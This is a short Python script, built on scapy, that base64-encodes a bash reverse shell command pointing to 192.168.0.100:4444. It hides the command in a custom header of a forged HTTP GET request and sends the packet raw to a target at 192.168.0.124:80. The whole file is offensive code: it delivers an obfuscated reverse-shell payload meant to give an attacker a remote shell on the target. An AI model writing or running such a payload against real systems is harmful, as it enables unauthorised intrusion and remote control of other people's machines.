from scapy.all import *
import base64

def create_obfuscated_payload():
    # Example reverse shell command, encoded to appear obfuscated
    reverse_shell_command = "bash -i >& /dev/tcp/192.168.0.100/4444 0>&1"
    
    # Obfuscate by encoding in base64
    encoded_command = base64.b64encode(reverse_shell_command.encode()).decode()
    # Create a fake HTTP GET request with obfuscated payload
    http_get_request = f"GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla\r\nX-Command: {encoded_command}\r\n\r\n"
    
    return http_get_request

def send_obfuscated_payload(target_ip, target_port):
    # Craft IP and TCP headers
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, sport=RandShort(), flags="PA")
    
    # Attach the obfuscated payload
    payload = create_obfuscated_payload()
    packet = ip / tcp / Raw(load=payload)
    
    # Send the packet
    send(packet, verbose=0)
    print(f"Sent obfuscated payload to {target_ip}:{target_port}")

if __name__ == "__main__":
    target_ip = "192.168.0.124"
    target_port = 80
    send_obfuscated_payload(target_ip, target_port)

